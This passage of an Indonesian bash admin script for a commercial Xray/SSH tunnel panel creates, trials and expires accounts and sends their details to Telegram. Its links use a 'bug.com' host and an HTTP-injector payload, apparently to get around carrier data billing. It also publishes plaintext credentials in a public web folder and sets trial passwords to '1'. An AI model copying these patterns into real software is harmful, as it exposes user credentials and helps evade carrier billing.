# ROBUST DATE PARSER + DELETE EXPIRED



#================================================







# parse_exp_ts: parse tanggal format "dd Mmm, YYYY HH:MM" atau "dd Mmm YYYY"



parse_exp_ts() {



    local s="${1//,/}"   # hapus koma



    local ts



    # Coba parse langsung (date -d cukup pintar)



    ts=$(date -d "$s" +%s 2>/dev/null)



    [[ -n "$ts" ]] && echo "$ts" && return



    # Coba ganti nama bulan singkat ke angka manual



    s=$(echo "$s" | sed '



        s/Jan/01/; s/Feb/02/; s/Mar/03/; s/Apr/04/;



        s/May/05/; s/Jun/06/; s/Jul/07/; s/Aug/08/;



        s/Sep/09/; s/Oct/10/; s/Nov/11/; s/Dec/12/;



    ')



    ts=$(date -d "$s" +%s 2>/dev/null)



    [[ -n "$ts" ]] && echo "$ts" && return



    echo ""



}







delete_expired() {



    clear



    print_menu_header "DELETE EXPIRED ACCOUNTS"



    local today count=0



    today=$(date +%s)



    shopt -s nullglob



    for f in "$AKUN_DIR"/*.txt; do



        [[ ! -f "$f" ]] && continue



        local exp_str exp_ts fname uname protocol



        exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | head -1 | cut -d= -f2-)



        [[ -z "$exp_str" ]] && continue



        exp_ts=$(parse_exp_ts "$exp_str")



        [[ -z "$exp_ts" ]] && continue



        if [[ $exp_ts -lt $today ]]; then



            fname=$(basename "$f" .txt)



            protocol=${fname%%-*}



            uname=${fname#*-}



            echo -e "  ${RED}Deleting${NC}: $fname"



            local tmp; tmp=$(mktemp)



            jq --arg email "$uname"                'del(.inbounds[].settings.clients[]? | select(.email == $email))'                "$XRAY_CONFIG" > "$tmp" 2>/dev/null &&                mv "$tmp" "$XRAY_CONFIG" || rm -f "$tmp"



            [[ "$protocol" == "ssh" ]] && userdel -f "$uname" 2>/dev/null



            rm -f "$f"



            rm -f "$PUBLIC_HTML/${fname}.txt"



            rm -f "$PUBLIC_HTML/${fname}-clash.yaml"



            ((count++))



        fi



    done



    shopt -u nullglob



    if [[ $count -gt 0 ]]; then



        fix_xray_permissions



        if xray -test -config "$XRAY_CONFIG" >/dev/null 2>&1; then



            systemctl restart xray 2>/dev/null



        else



            echo -e "  ${RED}\u2718 Xray config error setelah delete!${NC}"



        fi



        echo ""



        echo -e "  ${GREEN}\u2714 Deleted ${count} accounts!${NC}"



    else



        echo -e "  ${GREEN}\u2714 Tidak ada akun expired!${NC}"



    fi



    echo ""



    read -rp "  Press any key to back..."



}







#================================================



# CREATE ACCOUNT TEMPLATE - XRAY



# TLS=443, NonTLS=80, gRPC=443



#================================================







create_account_template() {



    local protocol="$1" username="$2" days="$3" quota="$4" iplimit="$5"



    local uuid ip_vps exp created







    # Cek dependency sebelum mulai



    if ! command -v jq >/dev/null 2>&1; then



        echo -e "  ${RED}✘ jq tidak terinstall! Install dulu: apt install jq${NC}"



        sleep 2; return 1



    fi



    if ! command -v xray >/dev/null 2>&1; then



        echo -e "  ${RED}✘ Xray tidak terinstall! Jalankan instalasi dulu.${NC}"



        sleep 2; return 1



    fi



    if [[ ! -f "$XRAY_CONFIG" ]]; then



        echo -e "  ${RED}✘ Config Xray tidak ditemukan! Jalankan instalasi dulu.${NC}"



        sleep 2; return 1



    fi







    uuid=$(cat /proc/sys/kernel/random/uuid)



    ip_vps=$(get_ip)



    exp=$(date -d "+${days} days" +"%d %b, %Y")



    created=$(date +"%d %b, %Y")







    local temp; temp=$(mktemp)



    if [[ "$protocol" == "vmess" ]]; then



        jq --arg uuid "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("vmess")).settings.clients) += [{"id":$uuid,"email":$email,"alterId":0}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null



    elif [[ "$protocol" == "vless" ]]; then



        jq --arg uuid "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("vless")).settings.clients) += [{"id":$uuid,"email":$email}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null



    elif [[ "$protocol" == "trojan" ]]; then



        jq --arg password "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("trojan")).settings.clients) += [{"password":$password,"email":$email}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null



    fi







    if [[ $? -eq 0 ]] && [[ -s "$temp" ]]; then



        # Validasi JSON hasil sebelum replace



        if ! jq empty "$temp" 2>/dev/null; then



            rm -f "$temp"



            echo -e "  ${RED}✘ Config xray tidak valid (JSON error)!${NC}"



            sleep 2; return 1



        fi



        mv "$temp" "$XRAY_CONFIG"



        fix_xray_permissions



        # Validasi config xray sebelum restart



        if xray -test -config "$XRAY_CONFIG" >/dev/null 2>&1; then



            systemctl restart xray 2>/dev/null



            sleep 1



        else



            echo -e "  ${RED}✘ Xray config error setelah update!${NC}"



            xray -test -config "$XRAY_CONFIG" 2>&1 | head -5 | sed 's/^/    /'



            sleep 2; return 1



        fi



    else



        rm -f "$temp"



        echo -e "  ${RED}✘ Gagal update Xray! Pastikan jq dan Xray sudah terinstall dengan benar.${NC}"



        sleep 2; return 1



    fi







    mkdir -p "$AKUN_DIR"



    printf "UUID=%s\nQUOTA=%s\nIPLIMIT=%s\nEXPIRED=%s\nCREATED=%s\n" \
        "$uuid" "$quota" "$iplimit" "$exp" "$created" \
        > "$AKUN_DIR/${protocol}-${username}.txt"







    # === GENERATE LINKS ===



    # TLS=443, NonTLS=80, gRPC=443



    local link_tls link_nontls link_grpc



    if [[ "$protocol" == "vmess" ]]; then



        local j_tls j_nontls j_grpc



        j_tls=$(printf '{"v":"2","ps":"%s","add":"bug.com","port":"443","id":"%s","aid":"0","net":"ws","path":"/vmess","type":"none","host":"%s","tls":"tls"}' "$username" "$uuid" "$DOMAIN")



        link_tls="vmess://$(printf '%s' "$j_tls" | base64 -w 0)"



        j_nontls=$(printf '{"v":"2","ps":"%s","add":"bug.com","port":"80","id":"%s","aid":"0","net":"ws","path":"/vmess","type":"none","host":"%s","tls":"none"}' "$username" "$uuid" "$DOMAIN")



        link_nontls="vmess://$(printf '%s' "$j_nontls" | base64 -w 0)"



        j_grpc=$(printf '{"v":"2","ps":"%s","add":"%s","port":"443","id":"%s","aid":"0","net":"grpc","path":"vmess-grpc","type":"none","host":"bug.com","tls":"tls"}' "$username" "$DOMAIN" "$uuid")



        link_grpc="vmess://$(printf '%s' "$j_grpc" | base64 -w 0)"



    elif [[ "$protocol" == "vless" ]]; then



        link_tls="vless://${uuid}@bug.com:443?path=%2Fvless&security=tls&encryption=none&host=${DOMAIN}&type=ws&sni=${DOMAIN}#${username}-TLS"



        link_nontls="vless://${uuid}@bug.com:80?path=%2Fvless&security=none&encryption=none&host=${DOMAIN}&type=ws#${username}-NonTLS"



        link_grpc="vless://${uuid}@${DOMAIN}:443?mode=gun&security=tls&encryption=none&type=grpc&serviceName=vless-grpc&sni=bug.com#${username}-gRPC"



    elif [[ "$protocol" == "trojan" ]]; then



        link_tls="trojan://${uuid}@bug.com:443?path=%2Ftrojan&security=tls&host=${DOMAIN}&type=ws&sni=${DOMAIN}#${username}-TLS"



        link_nontls="trojan://${uuid}@bug.com:80?path=%2Ftrojan&security=none&host=${DOMAIN}&type=ws#${username}-NonTLS"



        link_grpc="trojan://${uuid}@${DOMAIN}:443?mode=gun&security=tls&type=grpc&serviceName=trojan-grpc&sni=bug.com#${username}-gRPC"



    fi







    mkdir -p "$PUBLIC_HTML"



    cat > "$PUBLIC_HTML/${protocol}-${username}.txt" << DLEOF



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



  YOUZIN CRABZ TUNEL - ${protocol^^} Account



  The Professor



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Username         : ${username}



 IP VPS           : ${ip_vps}



 Domain           : ${DOMAIN}



 UUID/Password    : ${uuid}



 Quota            : ${quota} GB



 IP Limit         : ${iplimit} IP



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Port TLS         : 443



 Port NonTLS      : 80



 Port gRPC        : 443



 Network          : WebSocket / gRPC



 Path WS          : /${protocol}



 ServiceName gRPC : ${protocol}-grpc



 TLS              : enabled



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Link TLS         :



 ${link_tls}



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Link NonTLS      :



 ${link_nontls}



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Link gRPC        :



 ${link_grpc}



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Download         : http://${ip_vps}:81/${protocol}-${username}.txt



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Aktif Selama     : ${days} Hari



 Dibuat Pada      : ${created}



 Berakhir Pada    : ${exp}



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



DLEOF







    _print_xray_result "$protocol" "$username" "$ip_vps" "$uuid" "$quota" "$iplimit" \
        "$link_tls" "$link_nontls" "$link_grpc" "$days" "$created" "$exp"







    local dl_link="http://${ip_vps}:81/${protocol}-${username}.txt"



    send_telegram_admin \
"✅ <b>New ${protocol^^} Account - Youzin Crabz Tunel</b>



━━━━━━━━━━━━━━━━━━━━━━━━━



👤 Username   : <code>${username}</code>



🔑 UUID       : <code>${uuid}</code>



🌐 Domain     : <code>${DOMAIN}</code>



🖥️ IP VPS     : <code>${ip_vps}</code>



📦 Protocol   : ${protocol^^}



📊 Quota      : ${quota} GB



🔒 IP Limit   : ${iplimit} IP



━━━━━━━━━━━━━━━━━━━━━━━━━



🔌 Port TLS   : 443



🔌 Port NonTLS: 80



🔌 Port gRPC  : 443



━━━━━━━━━━━━━━━━━━━━━━━━━



📅 Dibuat     : ${created}



⏳ Berakhir   : ${exp}



🔗 Download   : ${dl_link}



━━━━━━━━━━━━━━━━━━━━━━━━━



<i>Powered by The Professor</i>"







    read -rp "  Press any key to back..."



}







#================================================



# PRINT XRAY RESULT



#================================================







_print_xray_result() {



    local protocol="$1" username="$2" ip_vps="$3" uuid="$4"



    local quota="$5" iplimit="$6" link_tls="$7" link_nontls="$8"



    local link_grpc="$9" days="${10}" created="${11}" exp="${12}"



    clear



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    echo -e "  ${WHITE}${BOLD}YOUZIN CRABZ TUNEL${NC} — ${YELLOW}${protocol^^} Account${NC}"



    echo -e "  ${DIM}The Professor${NC}"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Username"    "$username"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "IP VPS"      "$ip_vps"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Domain"      "$DOMAIN"



    printf "  ${WHITE}%-16s${NC} : ${CYAN}%s${NC}\n"  "UUID"        "$uuid"



    printf "  ${WHITE}%-16s${NC} : %s GB\n"            "Quota"       "$quota"



    printf "  ${WHITE}%-16s${NC} : %s IP\n"            "IP Limit"    "$iplimit"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Port TLS"    "443"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Port NonTLS" "80"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Port gRPC"   "443"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Network"     "WebSocket / gRPC"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Path WS"     "/${protocol}"



    printf "  ${WHITE}%-16s${NC} : %s\n" "ServiceName" "${protocol}-grpc"



    printf "  ${WHITE}%-16s${NC} : %s\n" "TLS"         "enabled"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${YELLOW}%-16s${NC} :\n" "Link TLS";   echo "  $link_tls"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${YELLOW}%-16s${NC} :\n" "Link NonTLS"; echo "  $link_nontls"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${YELLOW}%-16s${NC} :\n" "Link gRPC";   echo "  $link_grpc"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : http://%s:81/%s-%s.txt\n" "Download" "$ip_vps" "$protocol" "$username"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : ${YELLOW}%s Hari${NC}\n" "Aktif Selama" "$days"



    printf "  ${WHITE}%-16s${NC} : %s\n"  "Dibuat"    "$created"



    printf "  ${WHITE}%-16s${NC} : ${RED}%s${NC}\n" "Berakhir"  "$exp"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    echo ""



}







#================================================



# TRIAL XRAY - TLS=443, NonTLS=80, gRPC=443



#================================================







create_trial_xray() {



    local protocol="$1"



    local username="trial-$(date +%H%M%S)"



    local uuid ip_vps exp created







    # Cek dependency sebelum mulai



    if ! command -v jq >/dev/null 2>&1; then



        echo -e "  ${RED}✘ jq tidak terinstall! Install dulu: apt install jq${NC}"



        sleep 2; return



    fi



    if ! command -v xray >/dev/null 2>&1; then



        echo -e "  ${RED}✘ Xray tidak terinstall! Jalankan instalasi dulu.${NC}"



        sleep 2; return



    fi



    if [[ ! -f "$XRAY_CONFIG" ]]; then



        echo -e "  ${RED}✘ Config Xray tidak ditemukan!${NC}"



        sleep 2; return



    fi







    uuid=$(cat /proc/sys/kernel/random/uuid)



    ip_vps=$(get_ip)



    exp=$(date -d "+1 hour" +"%d %b, %Y %H:%M")



    created=$(date +"%d %b, %Y %H:%M")







    local temp; temp=$(mktemp)



    if [[ "$protocol" == "vmess" ]]; then



        jq --arg uuid "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("vmess")).settings.clients) += [{"id":$uuid,"email":$email,"alterId":0}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null



    elif [[ "$protocol" == "vless" ]]; then



        jq --arg uuid "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("vless")).settings.clients) += [{"id":$uuid,"email":$email}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null



    elif [[ "$protocol" == "trojan" ]]; then



        jq --arg password "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("trojan")).settings.clients) += [{"password":$password,"email":$email}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null



    fi







    if [[ $? -eq 0 ]] && [[ -s "$temp" ]]; then



        mv "$temp" "$XRAY_CONFIG"; fix_xray_permissions; systemctl restart xray 2>/dev/null; sleep 1



    else



        rm -f "$temp"; echo -e "  ${RED}✘ Gagal! Pastikan jq dan Xray sudah terinstall.${NC}"; sleep 2; return



    fi







    mkdir -p "$AKUN_DIR"



    printf "UUID=%s\nQUOTA=1\nIPLIMIT=1\nEXPIRED=%s\nCREATED=%s\nTRIAL=1\n" \
        "$uuid" "$exp" "$created" > "$AKUN_DIR/${protocol}-${username}.txt"







    (



        sleep 3600



        # File locking untuk mencegah race condition



        exec 200>"$XRAY_LOCK_FILE"



        flock -w 10 200 || exit 1



        local tmp2; tmp2=$(mktemp)



        jq --arg email "$username" \
           'del(.inbounds[].settings.clients[]? | select(.email == $email))' \
           "$XRAY_CONFIG" > "$tmp2" 2>/dev/null && \
           mv "$tmp2" "$XRAY_CONFIG" || rm -f "$tmp2"



        fix_xray_permissions; systemctl restart xray 2>/dev/null



        rm -f "$AKUN_DIR/${protocol}-${username}.txt"



        rm -f "$PUBLIC_HTML/${protocol}-${username}.txt"



        flock -u 200



    ) &



    disown $!







    # Generate links: TLS=443, NonTLS=80, gRPC=443



    local link_tls link_nontls link_grpc



    if [[ "$protocol" == "vmess" ]]; then



        local j_tls j_nontls j_grpc



        j_tls=$(printf '{"v":"2","ps":"%s","add":"bug.com","port":"443","id":"%s","aid":"0","net":"ws","path":"/vmess","type":"none","host":"%s","tls":"tls"}' "$username" "$uuid" "$DOMAIN")



        link_tls="vmess://$(printf '%s' "$j_tls" | base64 -w 0)"



        j_nontls=$(printf '{"v":"2","ps":"%s","add":"bug.com","port":"80","id":"%s","aid":"0","net":"ws","path":"/vmess","type":"none","host":"%s","tls":"none"}' "$username" "$uuid" "$DOMAIN")



        link_nontls="vmess://$(printf '%s' "$j_nontls" | base64 -w 0)"



        j_grpc=$(printf '{"v":"2","ps":"%s","add":"%s","port":"443","id":"%s","aid":"0","net":"grpc","path":"vmess-grpc","type":"none","host":"bug.com","tls":"tls"}' "$username" "$DOMAIN" "$uuid")



        link_grpc="vmess://$(printf '%s' "$j_grpc" | base64 -w 0)"



    elif [[ "$protocol" == "vless" ]]; then



        link_tls="vless://${uuid}@bug.com:443?path=%2Fvless&security=tls&encryption=none&host=${DOMAIN}&type=ws&sni=${DOMAIN}#${username}-TLS"



        link_nontls="vless://${uuid}@bug.com:80?path=%2Fvless&security=none&encryption=none&host=${DOMAIN}&type=ws#${username}-NonTLS"



        link_grpc="vless://${uuid}@${DOMAIN}:443?mode=gun&security=tls&encryption=none&type=grpc&serviceName=vless-grpc&sni=bug.com#${username}-gRPC"



    elif [[ "$protocol" == "trojan" ]]; then



        link_tls="trojan://${uuid}@bug.com:443?path=%2Ftrojan&security=tls&host=${DOMAIN}&type=ws&sni=${DOMAIN}#${username}-TLS"



        link_nontls="trojan://${uuid}@bug.com:80?path=%2Ftrojan&security=none&host=${DOMAIN}&type=ws#${username}-NonTLS"



        link_grpc="trojan://${uuid}@${DOMAIN}:443?mode=gun&security=tls&type=grpc&serviceName=trojan-grpc&sni=bug.com#${username}-gRPC"



    fi







    clear



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    echo -e "  ${WHITE}${BOLD}YOUZIN CRABZ TUNEL${NC} — ${YELLOW}Trial ${protocol^^} (1 Jam)${NC}"



    echo -e "  ${DIM}The Professor${NC}"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Username" "$username"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "IP VPS"   "$ip_vps"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Domain"   "$DOMAIN"



    printf "  ${WHITE}%-16s${NC} : ${CYAN}%s${NC}\n"  "UUID"     "$uuid"



    printf "  ${WHITE}%-16s${NC} : 1 GB\n" "Quota"



    printf "  ${WHITE}%-16s${NC} : 1 IP\n" "IP Limit"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Port TLS"    "443"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Port NonTLS" "80"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Port gRPC"   "443"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Path WS"     "/${protocol}"



    printf "  ${WHITE}%-16s${NC} : %s\n" "ServiceName" "${protocol}-grpc"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${YELLOW}Link TLS${NC} :\n  %s\n" "$link_tls"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${YELLOW}Link NonTLS${NC} :\n  %s\n" "$link_nontls"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${YELLOW}Link gRPC${NC} :\n  %s\n" "$link_grpc"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : ${YELLOW}1 Jam (Auto Delete)${NC}\n" "Aktif Selama"



    printf "  ${WHITE}%-16s${NC} : %s\n"  "Dibuat"   "$created"



    printf "  ${WHITE}%-16s${NC} : ${RED}%s${NC}\n" "Berakhir" "$exp"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    echo ""



    read -rp "  Press any key to back..."



}







#================================================



# CREATE SSH



#================================================







create_ssh() {



    clear



    print_menu_header "CREATE SSH ACCOUNT"



    read -rp "  Username      : " username



    [[ -z "$username" ]] && { echo -e "  ${RED}✘ Required!${NC}"; sleep 2; return; }



    if id "$username" &>/dev/null; then echo -e "  ${RED}✘ User sudah ada!${NC}"; sleep 2; return; fi



    read -rp "  Password      : " password



    [[ -z "$password" ]] && { echo -e "  ${RED}✘ Required!${NC}"; sleep 2; return; }



    read -rp "  Expired (days): " days



    [[ ! "$days" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Invalid!${NC}"; sleep 2; return; }



    read -rp "  Limit IP      : " iplimit



    [[ ! "$iplimit" =~ ^[0-9]+$ ]] && iplimit=1







    local exp exp_date created ip_vps



    exp=$(date -d "+${days} days" +"%d %b, %Y")



    exp_date=$(date -d "+${days} days" +"%Y-%m-%d")



    created=$(date +"%d %b, %Y")



    ip_vps=$(get_ip)







    if ! useradd -M -s /bin/false -e "$exp_date" "$username" 2>/dev/null; then



        echo -e "  ${RED}✘ Gagal membuat user sistem! Periksa apakah username sudah ada.${NC}"



        sleep 2; return



    fi



    echo "${username}:${password}" | chpasswd







    mkdir -p "$AKUN_DIR"



    printf "USERNAME=%s\nPASSWORD=%s\nIPLIMIT=%s\nEXPIRED=%s\nCREATED=%s\n" \
        "$username" "$password" "$iplimit" "$exp" "$created" \
        > "$AKUN_DIR/ssh-${username}.txt"







    _save_ssh_file "SSH Account" "$username" "$password" "$ip_vps" "$days" "$created" "$exp"



    _print_ssh_result "SSH Account" "$username" "$password" "$ip_vps" "$days" "$created" "$exp"







    send_telegram_admin \
"✅ <b>New SSH Account - Youzin Crabz Tunel</b>



━━━━━━━━━━━━━━━━━━━━━━━━━



👤 Username   : <code>${username}</code>



🔑 Password   : <code>${password}</code>



🌐 Domain     : <code>${DOMAIN}</code>



🖥️ IP VPS     : <code>${ip_vps}</code>



━━━━━━━━━━━━━━━━━━━━━━━━━



🔌 OpenSSH    : 22



🔌 Dropbear   : 222



🔌 SSL/TLS    : 443



🔌 BadVPN UDP : 7100-7300



━━━━━━━━━━━━━━━━━━━━━━━━━



📅 Dibuat     : ${created}



⏳ Berakhir   : ${exp}



🔗 Download   : http://${ip_vps}:81/ssh-${username}.txt



━━━━━━━━━━━━━━━━━━━━━━━━━



<i>Powered by The Professor</i>"







    read -rp "  Press any key to back..."



}







#================================================



# SSH TRIAL



#================================================







create_ssh_trial() {



    local suffix; suffix=$(cat /proc/sys/kernel/random/uuid | tr -d '-' | head -c 4 | tr '[:lower:]' '[:upper:]')



    local username="Trial-${suffix}" password="1" ip_vps exp exp_date created



    ip_vps=$(get_ip)



    exp=$(date -d "+1 hour" +"%d %b, %Y %H:%M")



    exp_date=$(date -d "+1 days" +"%Y-%m-%d")



    created=$(date +"%d %b, %Y %H:%M")







    if ! useradd -M -s /bin/false -e "$exp_date" "$username" 2>/dev/null; then



        echo -e "  ${RED}✘ Gagal membuat user sistem! Periksa apakah username sudah ada.${NC}"



        sleep 2; return



    fi



    echo "${username}:${password}" | chpasswd







    mkdir -p "$AKUN_DIR"



    printf "USERNAME=%s\nPASSWORD=%s\nIPLIMIT=1\nEXPIRED=%s\nCREATED=%s\nTRIAL=1\n" \
        "$username" "$password" "$exp" "$created" > "$AKUN_DIR/ssh-${username}.txt"







    (



        sleep 3600



        userdel -f "$username" 2>/dev/null



        rm -f "$AKUN_DIR/ssh-${username}.txt"



        rm -f "$PUBLIC_HTML/ssh-${username}.txt"



    ) &



    disown $!







    _save_ssh_file "Trial SSH (1 Jam)" "$username" "$password" "$ip_vps" "1 Jam (Auto Delete)" "$created" "$exp"



    _print_ssh_result "Trial SSH (1 Jam)" "$username" "$password" "$ip_vps" "1 Jam" "$created" "$exp"







    send_telegram_admin \
"🆓 <b>SSH Trial - Youzin Crabz Tunel</b>



━━━━━━━━━━━━━━━━━━━━━━━━━



👤 Username : <code>${username}</code>



🔑 Password : <code>${password}</code>



🌐 Domain   : <code>${DOMAIN}</code>



🖥️ IP VPS   : <code>${ip_vps}</code>



━━━━━━━━━━━━━━━━━━━━━━━━━



⏰ Aktif    : 1 Jam (Auto Delete)



📅 Expired  : ${exp}



━━━━━━━━━━━━━━━━━━━━━━━━━



<i>Powered by The Professor</i>"







    read -rp "  Press any key to back..."



}







#================================================



# SSH HELPERS



#================================================







_save_ssh_file() {



    local title="$1" username="$2" password="$3" ip_vps="$4" days="$5" created="$6" exp="$7"



    mkdir -p "$PUBLIC_HTML"



    cat > "$PUBLIC_HTML/ssh-${username}.txt" << SSHFILE



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



  YOUZIN CRABZ TUNEL - ${title}



  The Professor



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Username         : ${username}



 Password         : ${password}



 IP/Host          : ${ip_vps}



 Domain SSH       : ${DOMAIN}



 OpenSSH          : 22



 Dropbear         : 222



 Port SSH UDP     : 1-65535



 SSL/TLS          : 443



 SSH Ws Non SSL   : 80



 SSH Ws SSL       : 443



 BadVPN UDPGW     : 7100,7200,7300



 Format Hc        : ${DOMAIN}:80@${username}:${password}



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Save Link        : http://${ip_vps}:81/ssh-${username}.txt



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Payload          : GET / HTTP/1.1[crlf]Host: ${DOMAIN}[crlf]Upgrade: ws[crlf][crlf]



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Aktif Selama     : ${days}



 Dibuat Pada      : ${created}



 Berakhir Pada    : ${exp}



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



SSHFILE



}







_print_ssh_result() {



    local title="$1" username="$2" password="$3" ip_vps="$4" days="$5" created="$6" exp="$7"



    clear



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    echo -e "  ${WHITE}${BOLD}YOUZIN CRABZ TUNEL${NC} — ${YELLOW}${title}${NC}"



    echo -e "  ${DIM}The Professor${NC}"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Username"       "$username"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Password"       "$password"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "IP/Host"        "$ip_vps"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Domain SSH"     "$DOMAIN"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : %s\n" "OpenSSH"        "22"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Dropbear"       "222"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Port SSH UDP"   "1-65535"



    printf "  ${WHITE}%-16s${NC} : %s\n" "SSL/TLS"        "443"



    printf "  ${WHITE}%-16s${NC} : %s\n" "SSH Ws Non SSL" "80"



    printf "  ${WHITE}%-16s${NC} : %s\n" "SSH Ws SSL"     "443"



    printf "  ${WHITE}%-16s${NC} : %s\n" "BadVPN UDPGW"   "7100,7200,7300"



    printf "  ${WHITE}%-16s${NC} : %s:80@%s:%s\n" "Format Hc" "$DOMAIN" "$username" "$password"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : http://%s:81/ssh-%s.txt\n" "Save Link" "$ip_vps" "$username"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : GET / HTTP/1.1[crlf]Host: %s[crlf]Upgrade: ws[crlf][crlf]\n" "Payload" "$DOMAIN"



